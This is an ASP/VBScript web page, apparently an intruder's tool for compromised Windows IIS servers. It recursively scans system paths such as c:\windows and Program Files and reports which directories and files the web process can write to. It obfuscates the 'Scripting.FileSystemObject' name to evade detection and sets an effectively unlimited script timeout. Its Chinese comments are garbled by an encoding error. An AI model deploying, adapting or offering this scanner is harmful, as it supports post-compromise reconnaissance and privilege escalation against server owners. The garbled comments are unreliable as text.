<%


Response.Buffer = True
Server.ScriptTimeOut=999999999
  
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"


'��·������ \ 
function GetFullPath(path)
	GetFullPath = path
	if Right(path,1) <> "\" then GetFullPath = path&"\" '����ַ������ \ �ľͼ���
end function

'ɾ���ļ�
Function Deltextfile(filepath)
 On Error Resume Next
 Set objFSO = CreateObject(CONST_FSO) 
  if objFSO.FileExists(filepath) then '����ļ��Ƿ���� 
   objFSO.DeleteFile(filepath) 
  end if 
 Set objFSO = nothing
 Deltextfile = Err.Number '���ش����� 
End Function 


'���Ŀ¼�Ƿ��д 0 Ϊ�ɶ�д 1Ϊ��д������ɾ��
Function CheckDirIsOKWrite(DirStr)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)
	filepath = GetFullPath(DirStr)&fso.GettempName
	FSO.CreateTextFile(filepath) 
	CheckDirIsOKWrite = Err.Number '���ش����� 
	if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then
		Response.Write "[<font color=#0066FF>Ŀ¼</font>]"&DirStr&" [<font color=red>"&Err.Description&"</font>]<br>"
	end if
	set fout =Nothing
	set FSO = Nothing
	Deltextfile(filepath) 'ɾ����
	if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1
end Function

'����ļ��Ƿ�����޸�(�˷������޸�����,���ܻ��е㲻׼������������)
function CheckFileWrite(filepath)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)	
	set getAtt=FSO.GetFile(filepath)
	getAtt.Attributes = getAtt.Attributes
  CheckFileWrite = Err.Number 
	set FSO = Nothing
	set getAtt = Nothing  
end function

'���Ŀ¼�Ŀɶ�д��
function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)
	B = FSO.FolderExists(Path)
	set FSO=nothing
	
  '�Ƿ�Ϊ��ʱĿ¼���Ƿ�Ҫ���
  IS_TEMP_DIR =	(instr(UCase(Path),"WINDOWS\TEMP")>0) and NoCheckTemp
  		
	if B=false then '�������Ŀ¼�ͽ����ļ����
	'==========================================================================
		Re = CheckFileWrite(Path) '����Ƿ��д
		if Re =0 then
			Response.Write "[�ļ�]<font color=red>"&Path&"</font><br>"
			b =true
			exit function
		else
			Response.Write "[<font color=red>�ļ�</font>]"&Path&" [<font color=red>"&Err.Description&"</font>]<br>"						
			exit function
		end if	
	'==========================================================================	
	end if
	

	
	Path = GetFullPath(Path) '�� \	
	
	re = CheckDirIsOKWrite(Path) '��ǰĿ¼Ҳ���һ��
	if (re =0) or (re=1) then
		Response.Write "[Ŀ¼]<font color=#0000FF>"& Path&"</font><br>"
	end if

Set FSO = Server.CreateObject(CONST_FSO)
set f = fso.getfolder(Path)



if (CheckFile=True) and (IS_TEMP_DIR=false) then
b=false
'======================================
for each file in f.Files
	Re = CheckFileWrite(Path&file.name) '����Ƿ��д
	if Re =0 then
		Response.Write "[�ļ�]<font color=red>"& Path&file.name&"</font><br>"
		b =true
	else
		if ShowNoWriteDir then Response.Write "[<font color=red>�ļ�</font>]"&Path&file.name&" [<font color=red>"&Err.Description&"</font>]<br>"			
	end if
next
if b then response.Flush '��������ݾ�ˢ�¿ͻ�����ʾ
'======================================
end if



'============= Ŀ¼��� ================
for each file in f.SubFolders
if CheckNextDir=false then '�Ƿ�����һ��Ŀ¼
	re = CheckDirIsOKWrite(Path&file.name)
	if (re =0) or (re=1) then
		Response.Write "[Ŀ¼]<font color=#0066FF>"& Path&file.name&"</font><br>"
	end if
end if
	
	if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '�Ƿ�����һ��Ŀ¼
			ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir '�ټ����һ��Ŀ¼
	end if
next
'======================================
Set FSO = Nothing
set f = Nothing
end function


if Request("Paths") ="" then
Paths_str="c:\windows\"&chr(13)&chr(10)&"c:\Documents and Settings\"&chr(13)&chr(10)&"c:\Program Files\"
if Session("paths")<>"" then  Paths_str=Session("paths")
	Response.Write "<form id='form1' name='form1' method='post' action=''>"
	Response.Write "<textarea name='Paths' cols='80' rows='10'>"&Paths_str&"</textarea>"
	Response.Write "<br />"
	Response.Write "<input type='submit' name='button' value='��ʼ���' />"
	Response.Write "<label for='CheckNextDir'>"
	Response.Write "<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />����Ŀ¼  "
	Response.Write "</label>"
	Response.Write "<label for='CheckFile'>"
	Response.Write "<input name='CheckFile' type='checkbox' id='CheckFile' checked='checked'  />�����ļ�"
	Response.Write "</label>"
	Response.Write "<label for='ShowNoWrite'>"
	Response.Write "<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>"
	Response.Write "�Խ�дĿ¼���ļ�</label>"
	Response.Write "<label for='NoCheckTemp'>"
	Response.Write "<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />"
	Response.Write "�������ʱĿ¼</label>"	

	Response.Write "</form>"
else
Response.Write  "<a href=""?"">��������·��</a><br>"
CheckFile = (Request("CheckFile")="on")
CheckNextDir = (Request("CheckNextDir")="on")
ShowNoWriteDir = (Request("ShowNoWrite")="on")
NoCheckTemp = (Request("NoCheckTemp")="on")
Response.Write "��������Ҫһ����ʱ�����Ե�......<br>"
response.Flush

Session("paths") = Request("Paths")

PathsSplit=Split(Request("Paths"),chr(13)&chr(10)) 
For i=LBound(PathsSplit) To UBound(PathsSplit) 
if instr(PathsSplit(i),":")>0 then
	ShowDirWrite_Dir_File Trim(PathsSplit(i)),CheckFile,CheckNextDir
End If 
Next
Response.Write "[ɨ�����]<br>"
end if



%>